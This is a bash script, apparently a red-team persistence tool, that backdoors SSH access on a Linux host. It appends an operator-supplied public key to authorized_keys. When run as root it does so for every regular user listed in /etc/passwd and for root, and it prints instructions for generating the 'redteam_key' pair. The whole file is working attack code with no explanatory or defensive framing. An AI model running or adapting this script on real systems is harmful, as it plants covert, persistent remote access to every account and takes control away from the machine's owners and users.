#!/usr/bin/env bash

set -euo pipefail

SSH_PUBKEY="${SSH_PUBKEY:-}"

is_root() { [[ "$(id -u)" -eq 0 ]]; }

info() { echo "[*] $*"; }
success() { echo "[+] $*"; }
warn() { echo "[!] $*" >&2; }
error() { echo "[-] $*" >&2; }

inject_key() {
    local target_home="$1"
    local ssh_dir="${target_home}/.ssh"
    local auth_file="${ssh_dir}/authorized_keys"

    # Create ~/.ssh if it doesn't exist
    if [[ ! -d "$ssh_dir" ]]; then
        mkdir -p "$ssh_dir"
        chmod 700 "$ssh_dir"
    fi

    # Create authorized_keys if it doesn't exist
    if [[ ! -f "$auth_file" ]]; then
        touch "$auth_file"
        chmod 600 "$auth_file"
    fi

    # Check if the key is already present — don't add duplicates
    if grep -qF "$SSH_PUBKEY" "$auth_file" 2>/dev/null; then
        warn "Key already present in ${auth_file} — skipping"
        return 0
    fi

    echo "$SSH_PUBKEY" >> "$auth_file"
    success "Key injected into ${auth_file}"
}

if [[ -z "$SSH_PUBKEY" ]]; then
    error "SSH_PUBKEY is not set."
    error "Generate a keypair: ssh-keygen -t ed25519 -f redteam_key -N \"\""
    error "Then run: export SSH_PUBKEY=\"\$(cat redteam_key.pub)\""
    exit 1
fi

if is_root; then
    # Inject into every user's home directory
    info "Running as root — injecting into all user home directories"
    while IFS=: read -r username _ uid _ _ home _; do
        # Skip system accounts (uid < 1000) and entries with no real home
        [[ "$uid" -lt 1000 ]] && continue
        [[ -d "$home" ]] || continue
        info "Injecting for user: ${username} (${home})"
        inject_key "$home"
    done < /etc/passwd
    # Also inject into root's own home
    info "Injecting for root (/root)"
    inject_key "/root"
else
    # Just inject into the current user's home
    info "Injecting for current user: $(whoami)"
    inject_key "$HOME"
fi